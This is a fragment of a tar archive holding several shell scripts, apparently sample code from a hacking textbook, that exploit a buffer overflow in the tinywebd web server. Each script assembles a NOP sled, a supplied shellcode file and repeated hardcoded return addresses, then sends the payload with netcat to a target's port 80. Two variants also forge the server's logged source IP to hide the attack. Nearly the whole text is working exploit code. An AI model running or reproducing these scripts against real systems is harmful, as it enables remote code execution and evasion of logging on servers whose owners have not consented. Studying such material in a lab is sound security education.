   echo "Usage: $0 <shellcode file> <target IP>"
   exit
fi
OFFSET=540
RETADDR="\x24\xf6\xff\xbf" # at +100 bytes from buffer @ 0xbffff5c0
echo "target IP: $2"
SIZE=`wc -c $1 | cut -f1 -d ' '`
echo "shellcode: $1 ($SIZE bytes)"
ALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE))

echo "[NOP ($ALIGNED_SLED_SIZE bytes)] [shellcode ($SIZE bytes)] [ret addr ($((4*32)) bytes)]"
( perl -e "print \"\x90\"x$ALIGNED_SLED_SIZE";
 cat $1;
 perl -e "print \"$RETADDR\"x32 . \"\r\n\"";) | nc -w 1 -v $2 80
                                                                                                                                                                                                                                                                                                                                                                                                                                                      xtool_tinywebd_silent.sh                                                                            0000755 0001747 0001747 00000002036 12564742435 015364  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #!/bin/sh
# silent stealth exploitation tool for tinywebd
#    also spoofs IP address stored in memory

SPOOFIP="12.34.56.78"
SPOOFPORT="9090"

if [ -z "$2" ]; then  # if argument 2 is blank
   echo "Usage: $0 <shellcode file> <target IP>"
   exit
fi
FAKEREQUEST="GET / HTTP/1.1\x00"
FR_SIZE=$(perl -e "print \"$FAKEREQUEST\"" | wc -c | cut -f1 -d ' ')
OFFSET=540
RETADDR="\x24\xf6\xff\xbf" # at +100 bytes from buffer @ 0xbffff5c0
FAKEADDR="\xcf\xf5\xff\xbf" # +15 bytes from buffer @ 0xbffff5c0
echo "target IP: $2"
SIZE=`wc -c $1 | cut -f1 -d ' '`
echo "shellcode: $1 ($SIZE bytes)"
echo "fake request: \"$FAKEREQUEST\" ($FR_SIZE bytes)"
ALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE - $FR_SIZE - 16))

echo "[Fake Request $FR_SIZE] [spoof IP 16] [NOP $ALIGNED_SLED_SIZE] [shellcode $SIZE] [ret addr 128] [*fake_addr 8]"
(perl -e "print \"$FAKEREQUEST\"";
 ./addr_struct "$SPOOFIP" "$SPOOFPORT";
 perl -e "print \"\x90\"x$ALIGNED_SLED_SIZE";
 cat $1;
perl -e "print \"$RETADDR\"x32 . \"$FAKEADDR\"x2 . \"\x01\x00\x00\x00\r\n\"") | nc -w 1 -v $2 80

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  xtool_tinywebd_spoof.sh                                                                             0000755 0001747 0001747 00000001745 12564742435 015222  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #!/bin/sh
# IP spoofing stealth exploitation tool for tinywebd

SPOOFIP="12.34.56.78"
SPOOFPORT="9090"

if [ -z "$2" ]; then  # if argument 2 is blank
   echo "Usage: $0 <shellcode file> <target IP>"
   exit
fi
FAKEREQUEST="GET / HTTP/1.1\x00"
FR_SIZE=$(perl -e "print \"$FAKEREQUEST\"" | wc -c | cut -f1 -d ' ')
OFFSET=540
RETADDR="\x24\xf6\xff\xbf" # at +100 bytes from buffer @ 0xbffff5c0
FAKEADDR="\xcf\xf5\xff\xbf" # +15 bytes from buffer @ 0xbffff5c0
echo "target IP: $2"
SIZE=`wc -c $1 | cut -f1 -d ' '`
echo "shellcode: $1 ($SIZE bytes)"
echo "fake request: \"$FAKEREQUEST\" ($FR_SIZE bytes)"
ALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE - $FR_SIZE - 16))

echo "[Fake Request $FR_SIZE] [spoof IP 16] [NOP $ALIGNED_SLED_SIZE] [shellcode $SIZE] [ret addr 128] [*fake_addr 8]"
(perl -e "print \"$FAKEREQUEST\"";
 ./addr_struct "$SPOOFIP" "$SPOOFPORT";
 perl -e "print \"\x90\"x$ALIGNED_SLED_SIZE";
 cat $1;
perl -e "print \"$RETADDR\"x32 . \"$FAKEADDR\"x2 . \"\r\n\"") | nc -w 1 -v $2 80
                           xtool_tinywebd_steath.sh                                                                            0000755 0001747 0001747 00000001415 12564742435 015356  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #!/bin/sh
# stealth exploitation tool
if [ -z "$2" ]; then  # if argument 2 is blank
   echo "Usage: $0 <shellcode file> <target IP>"
   exit
fi
FAKEREQUEST="GET / HTTP/1.1\x00"
FR_SIZE=$(perl -e "print \"$FAKEREQUEST\"" | wc -c | cut -f1 -d ' ')
OFFSET=540
RETADDR="\x24\xf6\xff\xbf" # at +100 bytes from buffer @ 0xbffff5c0
echo "target IP: $2"
SIZE=`wc -c $1 | cut -f1 -d ' '`
echo "shellcode: $1 ($SIZE bytes)"
echo "fake request: \"$FAKEREQUEST\" ($FR_SIZE bytes)"
ALIGNED_SLED_SIZE=$(($OFFSET+4 - (32*4) - $SIZE - $FR_SIZE))

echo "[Fake Request ($FR_SIZE b)] [NOP ($ALIGNED_SLED_SIZE b)] [shellcode ($SIZE b)] [ret addr ($((4*32)) b)]"
(perl -e "print \"$FAKEREQUEST\" . \"\x90\"x$ALIGNED_SLED_SIZE";
 cat $1;
 perl -e "print \"$RETADDR\"x32 . \"\r\n\"") | nc -w 1 -v $2 80
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   